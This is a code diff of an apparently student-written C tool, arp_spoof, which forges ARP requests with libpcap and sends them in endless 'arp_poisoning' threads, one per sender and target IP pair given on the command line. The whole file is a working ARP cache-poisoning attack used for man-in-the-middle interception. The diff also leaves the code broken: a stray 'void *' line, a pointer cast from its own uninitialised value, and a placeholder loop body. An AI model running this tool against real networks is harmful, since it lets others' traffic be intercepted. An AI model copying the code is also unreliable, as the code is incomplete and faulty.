@@ -25,11 +25,22 @@
  *		- define ARPOP_REQUEST 1
  */
 
-struct arp_poisoning_s
+#define IP_ARRD_LEN 4
+struct arp_list_s
+{
+	uint8_t sip[IP_ARRD_LEN];
+	uint8_t tip[IP_ARRD_LEN];
+	uint8_t sha[ETHER_ADDR_LEN];
+	uint8_t tha[ETHER_ADDR_LEN];
+};
+
+struct arp_thread_arg_s
 {
 	pcap_t *handle;         /* Session handle */
-	int8_t *packet;
+	u_char *packet;
 };
+
+
 
 const unsigned char *kStringSysClassNet = "/sys/class/net/";
 const unsigned char *kStringAddress = "/address";
@@ -103,7 +114,7 @@ void print_arp_info(struct ether_arp *_arp_hdr)
  * target mac		:  6 byte
  * target ip		:  4 byte
  */
-uint8_t *create_arp_packet(uint8_t *_spa, uint8_t *_tpa, uint8_t *_sha, uint8_t *_tha)
+uint8_t *create_arp_packet(uint8_t *_sip, uint8_t *_tip, uint8_t *_sha, uint8_t *_tha)
 {
 	struct ether_header *eth_hdr = NULL;
 	struct ether_arp *arp_hdr = NULL;
@@ -125,28 +136,11 @@ uint8_t *create_arp_packet(uint8_t *_spa, uint8_t *_tpa, uint8_t *_sha, uint8_t 
 	arp_hdr->ea_hdr.ar_op = htons(ARPOP_REQUEST);
 
 	memcpy(arp_hdr->arp_sha, _sha, ETHER_ADDR_LEN);
-	if( 1 != inet_pton(AF_INET, _spa, arp_hdr->arp_spa ))	
-	{
-		printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
-		return 0;
-	}
-//	inet_pton(AF_INET, _spa, ip_addr_buf);
-//	memcpy(arp_hdr->arp_spa, ip_addr_buf, 4);
+	memcpy(arp_hdr->arp_spa, _sip, 4);
 
 	memcpy(arp_hdr->arp_tha, _tha, ETHER_ADDR_LEN);
-	if( 1 != inet_pton(AF_INET, _tpa, arp_hdr->arp_tpa ))
-	{
-		printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
-		return 0;
-	}
-//	inet_pton(AF_INET, _tpa, ip_addr_buf);
-//	memcpy(arp_hdr->arp_tpa, ip_addr_buf, 4);
+	memcpy(arp_hdr->arp_tpa, _tip, 4);
 
-	// print arp packet information.
-	printf("########## send arp packet info ##########\n");	
-	print_ether_info(eth_hdr);
-	print_arp_info(arp_hdr);
-	printf("\n");
 
 	return packet;
 }
@@ -162,17 +156,25 @@ uint8_t *create_arp_packet(uint8_t *_spa, uint8_t *_tpa, uint8_t *_sha, uint8_t 
  */
 void *arp_poisoning(void *_arp)
 {
-	struct arp_poisoning_s *arp = _arp;
+	struct arp_thread_arg_s *arp = _arp;
+	int arp_len = sizeof(struct ether_header) + sizeof(struct ether_arp);
 
 	while(1)
 	{
-		if(0 != pcap_sendpacket(arp->handle, arp->packet, (sizeof(struct ether_header)+sizeof(struct ether_arp))))
+		if(0 != pcap_sendpacket(arp->handle, arp->packet, arp_len))
 			continue;
 		sleep(1);
+		// print arp packet information.
+		struct ether_header *eth_hdr = (struct ether_header *) arp->packet;
+		struct ether_arp *arp_hdr = (struct ether_arp *) (arp->packet + sizeof(struct ether_header));
+		printf("########## send arp packet info ##########\n");	
+		print_ether_info(eth_hdr);
+		print_arp_info(arp_hdr);
+		printf("\n");
 	}
-
-	free(arp->packet);
 }
+
+void *
 
 /*
  * argv[1] : dev
@@ -187,13 +189,6 @@ int main(int argc, int8_t *argv[])
 	const uint8_t *packet;       /* The actual packet */
 
 
-	int i, re, ip_set_len;
-	uint8_t sha[ETHER_ADDR_LEN], tha[ETHER_ADDR_LEN];
-	struct ether_header *eth_hdr;
-	struct arp_poisoning_s *arp_list;
-	pthread_t *thread;
-
-
 	// check input format.
 	if( (argc < 4) || (0 != argc % 2) )
 	{
@@ -201,7 +196,6 @@ int main(int argc, int8_t *argv[])
 		return -1;
 	}
 
-	/* Open the session in promiscuous mode */
 	/*
 	 * pcap_open_live parameter(dev, len, promisc, ms, errbuf)
 	 * 	- dev    : name of the device
@@ -218,6 +212,13 @@ int main(int argc, int8_t *argv[])
 	}
 
 
+
+	int i, re, arp_list_len;
+	pthread_t *arp_poisoning_thread;
+	struct arp_list_s *arp_list;
+	struct arp_thread_arg_s *arp_thr_arg;
+
+	// create arp packet and arp poisoning using thread.
 	/*
 	 * int pthread_create(*id, *attr, *(*start_routine)(void *), *arg);
 	 *  - thread  : thread.
@@ -225,17 +226,31 @@ int main(int argc, int8_t *argv[])
 	 *  - routine : function which thread execute.
 	 *  - arg	  : function argument.
 	 */
-	ip_set_len = (argc >> 1) - 1;
-	get_mac_address(sha, argv[1]);
-	memset(tha, 0xff, ETHER_ADDR_LEN);
-	arp_list = (struct arp_poisoning_s *) malloc (ip_set_len * sizeof(struct arp_poisoning_s));
-	thread = (pthread_t *) malloc (ip_set_len * sizeof(pthread_t));
-	for(i=0; i<ip_set_len; i++)
+	arp_list_len = (argc >> 1) - 1;			// set arp list cnt.
+	arp_list = (struct arp_list_s *) malloc (arp_list_len * sizeof(struct arp_list_s));
+	arp_thr_arg = (struct arp_thread_arg_s *) malloc (arp_list_len * sizeof(struct arp_thread_arg_s));
+	arp_poisoning_thread = (pthread_t *) malloc (arp_list_len * sizeof(pthread_t));
+	for(i=0; i<arp_list_len; i++)
 	{
-		// create arp packet.
-		arp_list[i].handle = handle;
-		arp_list[i].packet = create_arp_packet(argv[i*2+2], argv[i*2+3], sha, tha);
-		if(0 > (re = pthread_create(&thread[i], NULL, arp_poisoning, (void *)&arp_list[i])))
+		get_mac_address(arp_list[i].sha, argv[1]);			// set sender hardware address.
+		memset(arp_list[i].tha, 0xff, ETHER_ADDR_LEN);		// set target hardware address.
+		// set sender IP address.
+		if( 1 != inet_pton(AF_INET, argv[i*2+2], arp_list[i].sip) )
+		{
+			printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+			return 0;
+		}
+		// set target IP address.
+		if( 1 != inet_pton(AF_INET, argv[i*2+3], arp_list[i].tip) )
+		{
+			printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+			return 0;
+		}
+
+		// create thread and run 'arp poisoning'.
+		arp_thr_arg[i].handle = handle;
+		arp_thr_arg[i].packet = create_arp_packet(arp_list[i].sip, arp_list[i].tip, arp_list[i].sha, arp_list[i].tha);
+		if( 0 > (re = pthread_create(&arp_poisoning_thread[i], NULL, arp_poisoning, (void *)&arp_thr_arg[i])) )
 		{
 			fprintf(stderr, "thread create error\n");
 			return -1;
@@ -243,12 +258,33 @@ int main(int argc, int8_t *argv[])
 	}
 
 
+	struct ether_header *eth_hdr;
+	struct ether_arp *arp_hdr;
+	// get target mac address through arp reply.
+	while( 0 <= (re = pcap_next_ex(handle, &header, &packet)) )
+	{
+		if( 0 == re)
+			continue;
+
+		eth_hdr = (struct ether_header *) eth_hdr;
+		if( ETHERTYPE_ARP == (ntohs(eth_hdr->ether_type) & 0x0000ffff))
+		{
+			for(i=0; i<arp_list_len; i++)
+			{
+				// ....
+			}
+		}
+	}
+
+
+
+	// 
 	while( 0 <= (re = pcap_next_ex(handle, &header, &packet)) )
 	{
 		if( 0 == re )
 			continue;
 
-		eth_hdr = (struct ether_header *) packet;
+		struct ether_header *eth_hdr = (struct ether_header *) packet;
 		switch((ntohs(eth_hdr->ether_type) & 0x0000ffff))
 		{
 			case ETHERTYPE_ARP:
